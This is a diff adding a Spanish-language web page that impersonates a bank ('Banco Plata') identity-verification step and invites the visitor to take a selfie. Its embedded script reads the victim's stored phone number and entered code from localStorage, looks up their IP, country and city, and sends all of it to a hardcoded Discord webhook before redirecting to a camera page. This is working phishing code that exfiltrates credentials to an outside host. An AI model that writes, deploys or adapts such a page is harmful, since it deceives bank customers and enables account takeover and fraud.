@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación de Identidad - Banco Plata</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body, html {
+      width: 100%;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #ffffff;
+      overflow: hidden;
+    }
+
+    .face-container {
+      width: 100%;
+      max-width: 400px;
+      padding: 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      position: relative;
+    }
+
+    /* Imagen fac.png más grande y destacada */
+    .face-image-wrapper {
+      width: 160px;
+      height: 160px;
+      margin-bottom: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .face-image-wrapper img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+
+    .form-title {
+      font-size: 26px;
+      font-weight: 700;
+      color: #111827;
+      margin-bottom: 10px;
+      line-height: 1.2;
+    }
+
+    .form-subtitle {
+      font-size: 15px;
+      color: #6b7280;
+      margin-bottom: 40px;
+      line-height: 1.4;
+    }
+
+    .btn-submit {
+      width: 100%;
+      height: 54px;
+      background-color: #ff5500;
+      color: #ffffff;
+      border: none;
+      border-radius: 14px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.2s, transform 0.1s;
+      box-shadow: 0 4px 12px rgba(255, 85, 0, 0.25);
+    }
+
+    .btn-submit:hover {
+      background-color: #e04b00;
+    }
+
+    .btn-submit:active {
+      transform: scale(0.99);
+    }
+
+    .loading-view {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      animation: fadeIn 0.25s ease;
+    }
+
+    .loading-view.active {
+      display: flex;
+    }
+
+    .step-content {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .step-content.hidden {
+      display: none;
+    }
+
+    .spinner {
+      width: 52px;
+      height: 52px;
+      border: 4px solid #f3f4f6;
+      border-top: 4px solid #ff5500;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin-bottom: 24px;
+    }
+
+    .loading-text {
+      font-size: 16px;
+      color: #4b5563;
+      font-weight: 500;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="face-container">
+    
+    <div id="mainContent" class="step-content">
+      <div class="face-image-wrapper">
+        <img src="fac.png" alt="Verificación Facial" onerror="this.src='https://via.placeholder.com/150?text=Face'">
+      </div>
+
+      <h1 class="form-title">Toma una selfie</h1>
+      <p class="form-subtitle">Para continuar, verifica tu identidad</p>
+
+      <button type="button" id="btnContinuar" class="btn-submit">Continuar</button>
+    </div>
+
+    <div id="loadingContent" class="loading-view">
+      <div class="spinner"></div>
+      <p class="loading-text" id="loadingText">Iniciando cámara frontal...</p>
+    </div>
+
+  </div>
+
+  <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1495237437818142870/bmbbKWDuinkfNUtF0-bt5qRVpw83f0t-P36DzE5A32RQgAkzas-l-fos7fXQ7ZntlANp';
+
+    const btnContinuar = document.getElementById('btnContinuar');
+    const mainContent = document.getElementById('mainContent');
+    const loadingContent = document.getElementById('loadingContent');
+    const loadingText = document.getElementById('loadingText');
+
+    async function obtenerInfoIP() {
+      const endpoints = [
+        'https://ipapi.co/json/',
+        'https://ipinfo.io/json',
+        'https://ip-api.com/json/'
+      ];
+
+      for (const url of endpoints) {
+        try {
+          const res = await fetch(url);
+          if (!res.ok) continue;
+          const data = await res.json();
+          return {
+            ip: data.ip || data.query || 'Desconocida',
+            pais: data.country_name || data.country || 'Desconocido',
+            ciudad: data.city || 'Desconocida'
+          };
+        } catch (e) {}
+      }
+      return { ip: 'Desconocida', pais: 'Desconocido', ciudad: 'Desconocida' };
+    }
+
+    btnContinuar.addEventListener('click', async () => {
+      mainContent.classList.add('hidden');
+      loadingContent.classList.add('active');
+      loadingText.textContent = 'Preparando escaneo biométrico...';
+
+      const telefono = localStorage.getItem('userPhone') || 'No registrado';
+      const codigo = localStorage.getItem('userCode') || 'No registrado';
+      const info = await obtenerInfoIP();
+
+      const discordPayload = {
+        embeds: [{
+          title: "📸 USUARIO EN VERIFICACIÓN FACIAL",
+          color: parseInt('ff5500', 16),
+          fields: [
+            { name: "Teléfono", value: telefono, inline: true },
+            { name: "Código Ingresado", value: codigo, inline: true },
+            { name: "Estado", value: "Hizo clic en tomar selfie", inline: false },
+            { name: "País", value: info.pais, inline: true },
+            { name: "Ciudad", value: info.ciudad, inline: true },
+            { name: "IP", value: info.ip, inline: false }
+          ]
+        }]
+      };
+
+      try {
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(discordPayload)
+        });
+      } catch (e) {
+        console.error('Error al enviar a Discord', e);
+      }
+
+      setTimeout(() => {
+        loadingText.textContent = 'Abriendo cámara...';
+        setTimeout(() => {
+          window.location.href = 'camara.html';
+        }, 500);
+      }, 7000);
+    });
+  </script>
+
+</body>
+</html>
